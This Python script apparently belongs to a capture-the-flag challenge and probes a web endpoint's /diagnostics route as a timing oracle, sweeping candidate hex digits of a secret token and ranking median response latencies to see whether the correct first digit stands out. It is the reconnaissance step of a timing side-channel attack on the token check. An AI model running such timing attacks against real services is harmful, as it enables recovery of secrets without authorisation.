#!/usr/bin/env python3
"""Quick characterization of the Stage 1 /diagnostics timing oracle.

Not the full token recovery (see exploit_stage1a.py). This just answers:
  1. What does the deploy actually return? (Is there a `compute_ns` field,
     i.e. the reported-raw-time design, or is the signal wall-clock only?)
  2. Over the real network, is position 0 separable? Sweeps the 16 hex
     digits padded with 'z' and prints median wall latency + any reported
     server time, so you can eyeball whether the correct first digit pops.

Usage:
    python probe_stage1_timing.py --base-url 'http://challs.nusgreyhats.org:34167/?token=tt_...'
"""
from __future__ import annotations

import argparse
import asyncio
import os
import statistics
import time

import httpx

from exploit_common import TOKEN_ENV_VAR, resolve_base_and_token

HEX = "0123456789abcdef"
TOKEN_LEN = 8


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser()
    p.add_argument("--base-url", required=True)
    p.add_argument(
        "--token",
        default=os.environ.get(TOKEN_ENV_VAR),
        help="Instancer access token (tt_...). May also be embedded in --base-url "
        f"as ?token=..., or supplied via the {TOKEN_ENV_VAR} env var.",
    )
    p.add_argument("--samples", type=int, default=15, help="probes per hex digit")
    p.add_argument("--connect-timeout", type=float, default=15.0)
    return p.parse_args()


async def probe(client: httpx.AsyncClient, token: str) -> tuple[float, dict]:
    t0 = time.perf_counter()
    try:
        r = await client.get("/api/v1/pinpoint/diagnostics", params={"token": token})
        dt = time.perf_counter() - t0
        try:
            body = r.json()
        except ValueError:
            body = {}
        return dt, body if isinstance(body, dict) else {}
    except httpx.HTTPError:
        return time.perf_counter() - t0, {}


async def main() -> int:
    args = parse_args()
    base_url, access_token = resolve_base_and_token(args.base_url, args.token)
    timeout = httpx.Timeout(60.0, connect=args.connect_timeout)
    async with httpx.AsyncClient(
        base_url=base_url, http2=True,
        follow_redirects=True, timeout=timeout,
    ) as client:
        if access_token:
            boot = await client.post("/api/auth/session", params={"token": access_token})
            print(f"/api/auth/session -> {boot.status_code} {boot.text[:120]}")
        me = await client.get("/api/me")
        print(f"/api/me -> {me.status_code} {me.text[:160]}")

        # 1) Response shape: is server-side time reported?
        _, body = await probe(client, "zzzzzzzz")
        print(f"diag(wrong) body keys: {sorted(body)}")
        reports_time = any(k for k in body if "ns" in k or "ms" in k or "compute" in k or "elapsed" in k)
        print(f"reports server-side time field? {reports_time}")

        # 2) Position-0 separability sweep.
        wall: dict[str, float] = {}
        srv: dict[str, float] = {}
        for d in HEX:
            tok = d + "z" * (TOKEN_LEN - 1)
            ws, ss = [], []
            for _ in range(args.samples):
                dt, b = await probe(client, tok)
                ws.append(dt * 1000)
                for k in ("compute_ns", "elapsed_ns"):
                    if isinstance(b.get(k), (int, float)):
                        ss.append(b[k] / 1e6)
            wall[d] = statistics.median(ws)
            if ss:
                srv[d] = statistics.median(ss)
        ranked = sorted(wall.items(), key=lambda kv: kv[1], reverse=True)
        print("\nposition 0 medians (ms), high->low:")
        for d, v in ranked:
            extra = f"  server={srv[d]:.3f}ms" if d in srv else ""
            print(f"  {d}: wall={v:7.2f}ms{extra}")
        top, second = ranked[0], ranked[1]
        print(f"\nwall margin (winner-runnerup): {top[1] - second[1]:+.2f} ms  "
              f"(winner={top[0]!r})")
        if srv:
            sr = sorted(srv.items(), key=lambda kv: kv[1], reverse=True)
            print(f"server margin: {sr[0][1]-sr[1][1]:+.4f} ms  (winner={sr[0][0]!r})")
    return 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
